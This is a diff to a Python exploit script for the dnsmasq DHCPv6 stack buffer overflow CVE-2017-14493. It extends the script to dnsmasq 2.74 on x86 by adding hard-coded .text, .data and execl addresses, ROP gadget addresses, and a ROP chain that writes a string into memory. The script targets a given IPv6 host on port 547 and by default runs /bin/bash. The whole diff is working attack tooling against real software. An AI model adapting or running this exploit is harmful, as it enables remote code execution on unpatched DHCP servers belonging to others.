@@ -20,6 +20,11 @@ from sys import exit
 # 0x08093240 - 0x08093f5c is .data
 # 0x08093f60 - 0x08094290 is .bss
 
+# dnsmasq/2.74 segments address without ASLR
+# 0x08049ee0 - 0x0807b7d2 is .text
+# 0x08093240 - 0x08093f5c is .data
+# 0x08093f60 - 0x08094290 is .bss
+
 # NOP
 NOP = {
     "x86": 0x90909090, 
@@ -39,27 +44,30 @@ JUNK = {
     "x86": {
         "2.77": 36,
         "2.76": 24,
-        "2.75": 24
+        "2.75": 24,
+        "2.74": 24,
     }
 }
 
 
-# Segment .text
+# Segment .text without ASLR
 TEXT = {
     "x86": {
         "2.77": 0x0804a310,
         "2.76": 0x08049f10,
-        "2.75": 0x08049ee0
+        "2.75": 0x08049ee0,
+        "2.74": 0x08049ee0,
     }
 }
 
 
-# Segment .data
+# Segment .data without ASLR
 DATA = {
     "x86": {
         "2.77": 0x0808b220,
         "2.76": 0x08096240,
-        "2.75": 0x08093240
+        "2.75": 0x08093240,
+        "2.74": 0x08093240
     }
 }
 
@@ -69,7 +77,8 @@ EXECL = {
     "x86": {
         "2.77": 0x08070758,
         "2.76": 0x0806c23c,
-        "2.75": 0x0806c00e
+        "2.75": 0x0806c00e,
+        "2.74": 0x0806c00e
     }
 }
 
@@ -90,6 +99,11 @@ POP_EAX_275x86 = 0x0805cbfa      # pop eax ; ret
 POP_EBX_275x86 = 0x08049641      # pop ebx ; ret
 MOV_EAX_EBX_275x86 = 0x0804d433  # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
 
+# dnsmasq/2.74 x86 without ASLR
+POP_EAX_274x86 = 0x0805cbfa      # pop eax ; ret
+POP_EBX_274x86 = 0x08049641      # pop ebx ; ret
+MOV_EAX_EBX_274x86 = 0x0804d433  # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
+
 
 Base = Base()
 Base.print_banner()
@@ -99,7 +113,8 @@ parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 (Stack B
 parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
 parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
 parser.add_argument('-c', '--capacity', help='Set capacity (x86 or x86_64), default=x86', default='x86')
-parser.add_argument('-v', '--version', help='Set dnsmasq version (2.75, 2.76, 2.77), default=2.77', default='2.77')
+parser.add_argument('-v', '--version', help='Set dnsmasq version (2.74, 2.75, 2.76, 2.77),' +
+                                            ' default=2.77', default='2.77')
 
 parser.add_argument('--interpreter', type=str, help='Set path to interpreter on target, ' +
                                                     'default="/bin/bash"', default='/bin/bash')
@@ -126,10 +141,10 @@ else:
     exit(1)
 
 dnsmasq_version = ""
-if args.version == "2.75" or args.version == "2.76" or args.version == "2.77":
+if args.version == "2.74" or args.version == "2.75" or args.version == "2.76" or args.version == "2.77":
     dnsmasq_version = args.version
 else:
-    print Base.c_error + "Bad dnsmasq version: " + args.version + " allow only 2.75, 2.76 or 2.77!"
+    print Base.c_error + "Bad dnsmasq version: " + args.version + " allow only 2.74, 2.75, 2.76 or 2.77!"
     exit(1)
 
 interpreter = str(args.interpreter)
@@ -241,6 +256,16 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(POP_EBX_275x86)        # pop ebx ; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
                 rop_chain += Base.pack32(MOV_EAX_EBX_275x86)    # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
+
+        if dnsmasq_version == "2.74":
+            for x in range(0, len(string), 4):
+                rop_chain += Base.pack32(POP_EAX_274x86)        # pop eax ; ret
+                rop_chain += Base.pack32(addr_in_data + x)      # address in .data
+                rop_chain += Base.pack32(POP_EBX_274x86)        # pop ebx ; ret
+                rop_chain += string[x:x + 4]                    # 4 byte of string
+                rop_chain += Base.pack32(MOV_EAX_EBX_274x86)    # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
                 rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in ebx
                 rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
 
